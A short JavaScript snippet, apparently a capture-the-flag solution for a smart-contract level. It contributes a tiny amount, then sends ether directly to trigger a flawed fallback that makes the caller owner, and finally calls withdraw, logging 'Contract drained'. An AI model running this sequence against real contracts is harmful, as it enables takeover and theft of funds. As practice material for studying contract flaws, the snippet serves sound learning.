async function solve() {
  await contract.contribute({ value: 1 });
  await contract.sendTransaction({ value: 1 });

  const owner = await contract.owner();
  console.log("New owner:", owner);

  await contract.withdraw();
  console.log("Contract drained");
}

solve();
